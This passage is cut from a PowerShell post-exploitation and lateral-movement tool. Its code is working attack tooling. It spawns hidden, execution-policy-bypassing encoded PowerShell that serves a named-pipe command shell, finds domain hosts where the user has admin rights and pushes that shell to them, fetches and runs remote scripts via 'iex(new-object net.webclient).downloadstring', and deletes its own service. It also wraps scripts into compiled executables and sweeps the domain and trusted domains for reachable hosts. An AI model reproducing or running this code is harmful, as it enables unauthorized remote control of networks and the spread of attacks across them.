			}

			if ($commandParts -icontains "-DomainController") {
				$index = [array]::IndexOf($commandParts, "-DomainController", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdc = $commandParts[$index + 1]
			}
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
			
			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
	
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
			
			if($userdefusername -AND $userdefpassword){
				if($userdeftargets){
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
				}
				else{
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
				}
			}
			else{
				if($userdeftargets){
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
				}
				else{
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("`$Find = Find-LocalAdminAccess -Method PSRemoting;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#")
						$sw.Flush()
					}
				}
			}
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
					Write-Output $line
				}
			}
			
			$serverOutput = $serverOutput.Trim()
			$serverOutput = ($serverOutput | Out-String) -split "`n"
			$serverOutput = $serverOutput.Trim()
			$serverOutput = $serverOutput | Where-Object { $_ -ne "" }
			
			$adminLines = $serverOutput | Where-Object { $_ -match "has Local Admin access on" }
			$noAccessLines = $serverOutput | Where-Object { $_ -match "No Access" }
			
			if($adminLines.Count -eq 0){
				# Failed to execute
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
				# No Admin Access
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
				if($Admin){
					$stoparguments = "delete $serviceToDelete"
					$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
					$sw.Flush()
				}
				$TempAdminAccessTargets = $serverOutput | Where-Object { $_ -notmatch "has Local Admin access on" -AND $_ -notmatch "Command execution completed"}
				
				$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"
				
				$global:ScanModer = $True
				$global:RestoreOldMultiPipeName = $True
				$global:OldTargetsToRestore = $global:AllUserDefinedTargets
				$global:AllUserDefinedTargets = $TempAdminAccessTargets
				$global:RestoreAllUserDefinedTargets = $True
				Start-Sleep 1
				break
			}
		}
		
		elseif ($command -like "shell_tknadmin*") {
			
			$commandParts = $command -split '\s+', 7

			# Initialize the variables to empty strings
			$userdeftargets = ""
			$userdefdomain = ""
			$userdefdc = ""
			
			# Assign values based on their presence
			if ($commandParts -icontains "-Targets") {
				$index = [array]::IndexOf($commandParts, "-Targets", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdeftargets = $commandParts[$index + 1]
			}
			
			if ($commandParts -icontains "-Domain") {
				$index = [array]::IndexOf($commandParts, "-Domain", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdomain = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-DomainController") {
				$index = [array]::IndexOf($commandParts, "-DomainController", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdc = $commandParts[$index + 1]
			}
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
			
			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
	
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
			
			if($userdeftargets){
				if($userdefdomain -AND -not $userdefdc){
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
				elseif($userdefdomain -AND $userdefdc){
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
				else{
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
			}
			else{
				if($userdefdomain -AND -not $userdefdc){
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
				elseif($userdefdomain -AND $userdefdc){
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
				else{
					$sw.WriteLine("`$Find = @();`$Find = Access_Check -Method PSRemoting;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find")
					$sw.Flush()
				}
			}
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
					Write-Output $line
				}
			}
			
			$serverOutput = $serverOutput.Trim()
			$serverOutput = ($serverOutput | Out-String) -split "`n"
			$serverOutput = $serverOutput.Trim()
			$serverOutput = $serverOutput | Where-Object { $_ -ne "" }
			
			$adminLines = $serverOutput | Where-Object { $_ -match "The current user has" }
			$noAccessLines = $serverOutput | Where-Object { $_ -match "No Access" }
			
			if($adminLines.Count -eq 0){
				# Failed to execute
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
				# No Admin Access
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
				
				$TempAdminAccessTargets = $serverOutput | Where-Object { $_ -notmatch "The current user has"}
				
				$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"
				
				$global:ScanModer = $True
				$global:RestoreOldMultiPipeName = $True
				$global:OldTargetsToRestore = $global:AllUserDefinedTargets
				$global:AllUserDefinedTargets = $TempAdminAccessTargets
				$global:RestoreAllUserDefinedTargets = $True
				
				$sw.WriteLine("`$job = Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob")
				$sw.Flush()
				
				$sw.WriteLine("`$job | Wait-Job;`$job | Remove-Job")
				$sw.Flush()
				
				$SyncString = "ababcdcdefefghgh"
			
				$sw.WriteLine("Write-Output $SyncString")
				$sw.Flush()
				
				while($true){
					$line = $sr.ReadLine()
					if ($line -eq "$SyncString") {
						break
					}
				}
				
				while($true){
					$line = $sr.ReadLine()
					if ($line -eq "#END#") {
						break
					}
				}
				
				if($Admin){
					$stoparguments = "delete $serviceToDelete"
					$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
					$sw.Flush()
				}
				
				Start-Sleep 1
				
				break
			}
		}
		
		elseif($Command -eq "Remoting"){
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SMBRemoting.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1')")
			$sw.Flush()
			
			PrintHelpRemoting
			
		}
		
		elseif (($command -like "SMBRemoting *") -OR ($command -like "WMIRemoting *")) {
			
			$commandParts = $command -split '\s+', 3
			$Method = $commandParts[0]
			$Target = $commandParts[1]
			$Command = $commandParts[2]
			
			if($Method -eq 'SMBRemoting'){
				$sw.WriteLine("Invoke-SMBRemoting -ComputerName `"$Target`" -Command `"$Command`"")
				$sw.Flush()
			}
			
			if($Method -eq 'WMIRemoting'){
				$sw.WriteLine("Invoke-WMIRemoting -ComputerName `"$Target`" -Command `"$Command`"")
				$sw.Flush()
			}
		}
		
		elseif($command -ne ""){
			$sw.WriteLine($command)
			$sw.Flush()
		}
		
		else{continue}

		# Read response from the client
		if(!$global:RestoreTimeout){$timeoutSeconds = 30}
		else{$global:RestoreTimeout = $False}

		$runspace = [runspacefactory]::CreateRunspace()
		$runspace.Open()

		$scriptBlock = {
			param ($sr)
			$output = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					return $output
				}
				$output += "$line`n"
			}
		}

		$psCmd = [powershell]::Create().AddScript($scriptBlock).AddArgument($sr)
		$psCmd.Runspace = $runspace
		$handle = $psCmd.BeginInvoke()

		if ($handle.AsyncWaitHandle.WaitOne($timeoutSeconds * 1000)) {
			$output = $psCmd.EndInvoke($handle)
			# Remove the last empty line, if it exists
			$output = $output -replace "`n$", ""

			# Add one empty line at the end
			#$output += "`n"

			Write-Output $output
			Write-Output ""
		} else {
			$global:Message += " [-] The operation timed out [$computerNameOnly]`n"
			#$runspace.Close()
			break
		}

		$runspace.Close()

	}
	
}

function PS1ToEXE {
    Param (
        [string]$content,
		[string]$outputFile
    )

    $script = [System.Convert]::ToBase64String(([System.Text.Encoding]::UTF8.GetBytes($content)))

    $translate = @"
using System;
using System.Management.Automation;
using System.Text;
using System.Reflection;

namespace ModuleNamespace
{
    class Program
    {
        static void Main(string[] args)
        {
            string script = @"$script";
            PowerShell ps = PowerShell.Create();
            ps.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(script)));
            ps.Invoke();
        }
    }
}
"@

    $assemblyPath = ([System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.Name -ieq "System.Management.Automation.dll" } | Select-Object -First 1).Location

    $params = New-Object System.CodeDom.Compiler.CompilerParameters
    $params.GenerateExecutable = $true
    $params.OutputAssembly = $outputFile
    $params.CompilerOptions = "/platform:x64 /target:exe"
    $params.ReferencedAssemblies.Add("System.dll") > $null
    $params.ReferencedAssemblies.Add("System.Core.dll") > $null
    $params.ReferencedAssemblies.Add($assemblyPath) > $null

    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider

    $results = $provider.CompileAssemblyFromSource($params, $translate)
}

function CheckReachableHosts {
	param(
		[string]$Domain,
		[string]$DomainController,
		[switch]$WMI
	)
	
	if(!$global:AllUserDefinedTargets){
				
		# All Domains
		$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
		if(!$FindCurrentDomain){$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
		if(!$FindCurrentDomain){$FindCurrentDomain = $env:USERDNSDOMAIN}
		if(!$FindCurrentDomain){$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		
		$ParentDomain = ($FindCurrentDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name)
		$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ParentDomain)
		$ChildContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
		$ChildDomains = @($ChildContext | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name)
		
		$AllDomains = @($ParentDomain)
		
		if($ChildDomains){
			foreach($ChildDomain in $ChildDomains){
				$AllDomains += $ChildDomain
			}
		}
		
		# Trust Domains (save to variable)
		$TrustTargetNames = @(foreach($AllDomain in $AllDomains){(FindDomainTrusts -Domain $AllDomain).TargetName})
		$TrustTargetNames = $TrustTargetNames | Sort-Object -Unique
		$TrustTargetNames = $TrustTargetNames | Where-Object { $_ -notin $AllDomains }
		
		# Remove Outbound Trust from $AllDomains
		$OutboundTrusts = @(foreach($AllDomain in $AllDomains){FindDomainTrusts -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName})
		
		
		foreach($TrustTargetName in $TrustTargetNames){
			$AllDomains += $TrustTargetName
		}
		
		$AllDomains = $AllDomains | Sort-Object -Unique
		
		$PlaceHolderDomains = $AllDomains
		$AllDomains = $AllDomains | Where-Object { $_ -notin $OutboundTrusts }
		
		### Remove Unreachable domains
		$ReachableDomains = $AllDomains

		foreach($AllDomain in $AllDomains){
			$ReachableResult = $null
			$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)
			$ReachableResult = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
			if($ReachableResult){}
			else{$ReachableDomains = $ReachableDomains | Where-Object { $_ -ne $AllDomain }}
		}

		$AllDomains = $ReachableDomains
		
		$Computers = @()
		foreach($AllDomain in $AllDomains){
			$Computers += Get-ADComputers -ADCompDomain $AllDomain
		}
		$Computers = $Computers | Sort-Object
	}
	
	else{
		$Computers = $global:AllUserDefinedTargets
	}
	
	if($WMI){$Port = 135}
	else{$Port = 445}
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer, $Port)
		
		$tcpClient = New-Object System.Net.Sockets.TcpClient
		$asyncResult = $tcpClient.BeginConnect($computer, $Port, $null, $null)
		$wait = $asyncResult.AsyncWaitHandle.WaitOne(100)
		if ($wait) {
			try {
				$tcpClient.EndConnect($asyncResult)
				return $computer
			} catch {}
		}
		$tcpClient.Close()
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Computers) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($Port)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$reachable_hosts = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$reachable_hosts += $result
		}
	}
	
	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$reachable_hosts = $reachable_hosts | Where-Object {$_ -ne $HostFQDN}
	$reachable_hosts = $reachable_hosts | Where-Object { $_ -and $_.trim() }
	$reachable_hosts

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
	
}

function WMIAdminAccess {
	
    param (
        [string]$Targets,
		[string]$Command
    )
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"

	$Computers = $Targets
	$Computers = $Computers -split ","
	$Computers = $Computers | Sort-Object -Unique
    $Computers = $Computers | Where-Object { $_ -and $_.trim() }
	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$TempHostname = $HostFQDN -replace '\..*', ''
	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}

	$ScriptBlock = {
		param ($Computer)
	
		$Error.Clear()

		Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue
		
		if($error[0] -eq $null) {
			return @{
				Computer = $Computer
				Success  = $true
			}
		} else {
			return @{
				Computer = $Computer
				Success  = $false
				Message  = $error[0].ToString()
			}
		}
	}

	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()
	$runspaces = New-Object System.Collections.ArrayList

	foreach ($Computer in $Computers) {
		$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer)
		$runspace.RunspacePool = $runspacePool
		$null = $runspaces.Add([PSCustomObject]@{
				Pipe = $runspace
				Status = $runspace.BeginInvoke()
		})
	}

	$ComputerAccess = @()
	foreach ($run in $runspaces) {
		try {
			$result = $run.Pipe.EndInvoke($run.Status)
		} catch {}
		if ($result.Success) {
			$ComputerAccess += $result.Computer
		} else {}
	}

	$runspaces | ForEach-Object {$_.Pipe.Dispose()}

	$runspacePool.Close()
	$runspacePool.Dispose()
	
	$ComputerAccess = $ComputerAccess.Trim()
	$ComputerAccess = ($ComputerAccess | Out-String) -split "`n"
	$ComputerAccess = $ComputerAccess.Trim()
	$ComputerAccess = $ComputerAccess | Where-Object { $_ -ne "" }
	
	if(!$ComputerAccess){return}
	
	$ComputerAccess

	# Create and open a runspace pool
	$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
	$RunspacePool.Open()

	$scriptBlock = {
		param($Computer, $Command, $WmiScript)

		. ([ScriptBlock]::Create($WmiScript))
		
		Invoke-WMIRemoting -ComputerName $Computer -Command $Command
	}

	$JobObjects = @()
	
	foreach ($Computer in $ComputerAccess) {
		$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($WmiScript)
		$Job.RunspacePool = $RunspacePool
		$JobObjects += @{
			PowerShell = $Job
			Handle     = $Job.BeginInvoke()
		}
	}
}

$WmiScript = @'
function Invoke-WMIRemoting {
	
	<#
	.SYNOPSIS
	Invoke-WMIRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-WMIRemoting
	
	#>
	
	param (
	[Parameter(Mandatory = $true)]
	[string]$ComputerName,
	[string]$Command,
	[string]$UserName,
	[string]$Password
	)

 	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	if($UserName -AND $Password){
		$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
		$cred = New-Object System.Management.Automation.PSCredential($UserName,$SecPassword)
	}

	$ClassID = "Custom_WMI_" + (Get-Random)
	$KeyID = "CmdGUID"
	
	try{	
		if($UserName -AND $Password){$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred}
	 	else{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace "root\cimv2"}
   	} catch {Write-Output "[-] Access Denied"; Write-Output ""; break}

     	try{
		if (-not $classExists) {
			
